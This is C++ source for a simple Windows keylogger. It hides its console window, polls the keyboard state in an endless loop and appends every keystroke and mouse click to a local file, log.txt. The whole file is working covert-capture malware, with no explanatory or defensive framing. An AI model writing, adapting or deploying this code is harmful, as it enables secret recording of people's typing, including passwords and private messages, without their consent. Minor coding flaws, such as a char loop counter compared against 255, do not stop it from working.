#include <iostream>
#include <windows.h>

using namespace std;

int Save(int _key,char *file);

int main()
{
    FreeConsole();  
    char i;

    while(1)
    {
        Sleep(100);
        for (i=8;i<=255;i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            {
                Save(i,"log.txt");
            }
        }
    }

    return 0;
}

int Save(int _key,char *file)
{
    cout << _key << endl;
    Sleep(100);
    FILE *OUTPUT_FILE;

    OUTPUT_FILE = fopen(file,"a+");

    if (_key == VK_SHIFT)
        fprintf(OUTPUT_FILE,"%s","[SHIFT]");

    else if (_key == VK_BACK)
        fprintf(OUTPUT_FILE,"%s","[BACK]");

    else if (_key == VK_LBUTTON)
        fprintf(OUTPUT_FILE,"%s","[Left Click]");
    
    else if (_key == VK_TAB)
        fprintf(OUTPUT_FILE,"%s","[TAB]");

    else if (_key == VK_SPACE)
        fprintf(OUTPUT_FILE,"%s"," ");
    
    else if (_key == VK_UP)
        fprintf(OUTPUT_FILE,"%s","[UP]");
    
    else if (_key == VK_LEFT)
        fprintf(OUTPUT_FILE,"%s","[LEFT]");

    else if (_key == VK_RIGHT)
        fprintf(OUTPUT_FILE,"%s","[RIGHT]");

    else if (_key == VK_DOWN)
        fprintf(OUTPUT_FILE,"%s","[DOWN]");

    else if (_key == VK_RETURN)
        fprintf(OUTPUT_FILE,"%s","[ENTER]");

    else if (_key == VK_ESCAPE)
        fprintf(OUTPUT_FILE,"%s","[ESC]");

    else if (_key == VK_RBUTTON)
        fprintf(OUTPUT_FILE,"%s","[Right Click]");

    else
    {
        fprintf(OUTPUT_FILE,"%s",&_key);
    }
    

    
    fclose(OUTPUT_FILE);

    return 0;
}